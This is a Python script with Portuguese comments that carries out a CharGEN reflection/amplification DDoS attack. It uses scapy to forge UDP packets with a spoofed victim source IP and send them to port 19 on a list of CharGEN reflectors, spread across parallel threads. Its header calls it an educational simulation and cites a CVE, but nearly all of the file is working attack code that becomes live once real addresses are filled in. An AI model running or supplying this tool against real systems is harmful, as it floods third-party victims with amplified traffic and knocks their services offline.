'''
###################################################### DISCLAIMER #######################################################
|  Comando para identificar se seu servidor possui a porta aberta:                                                      |
|  nmap -p 19 <target>                                                                                                  |
|  Simulação educacional de ataque CharGEN.                                                                             |
|  Para mais informações sobre ataques de amplificação CharGEN, consulte:                                               |
|  https://www.cve.org/CVERecord?id=CVE-2000-0504                                                                       |
|  I am NOT responsible for any damages caused or any crimes committed by using this tool.                              |
#########################################################################################################################
'''

from scapy.all import IP, UDP, send
from concurrent.futures import ThreadPoolExecutor

def simulate_char_gen_dr_dos(target_ip, chargen_server, num_packets=10):
    """
    Simula um ataque DRDoS CharGEN para fins educativos.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param chargen_server: Servidor CharGEN vulnerável para enviar as solicitações.
    :param num_packets: Número de pacotes a serem enviados.
    """
    chargen_payload = (
        "GET / HTTP/1.0\r\n"
        "Host: 255.255.255.255\r\n"
        "User-Agent: CharGEN\r\n\r\n"
    )
    for i in range(num_packets):
        # Construindo o pacote UDP para o ataque DRDoS
        packet = (
            IP(src=target_ip, dst=chargen_server) /
            UDP(sport=53, dport=19) /  # Porta 19 (CharGEN) e UDP
            chargen_payload.encode('utf-8')
        )
        print(f"[{i+1}/{num_packets}] Enviando pacote para {chargen_server} como se fosse de {target_ip}...")
        send(packet, verbose=0)

def simulate_char_gen_dr_dos_multiple(target_ip, chargen_servers, num_packets_per_server=10, num_threads=4):
    """
    Simula um ataque DRDoS CharGEN contra múltiplos servidores simultaneamente.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param chargen_servers: Lista de servidores CharGEN vulneráveis para enviar as solicitações.
    :param num_packets_per_server: Número de pacotes a serem enviados por servidor.
    :param num_threads: Número de threads a serem usadas para execução paralela.
    """
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [
            executor.submit(simulate_char_gen_dr_dos, target_ip, chargen_server, num_packets_per_server)
            for chargen_server in chargen_servers
        ]
        # Espera todas as threads finalizarem
        for future in futures:
            future.result()

if __name__ == "__main__":
    TARGET_IP = "192.168.1.1"  # IP da vítima (falsificado)

    # Lista de servidores CharGEN vulneráveis
    CHARGEN_SERVERS = [
    "192.168.1.2","192.168.1.3"
]


    NUM_PACKETS_PER_SERVER = 1  # Número de pacotes a enviar por servidor
    NUM_THREADS = 10  # Número de threads para paralelismo

    print("Simulando ataque DRDoS CharGEN...")
    simulate_char_gen_dr_dos_multiple(TARGET_IP, CHARGEN_SERVERS, NUM_PACKETS_PER_SERVER, NUM_THREADS)
    print("Simulação concluída.")
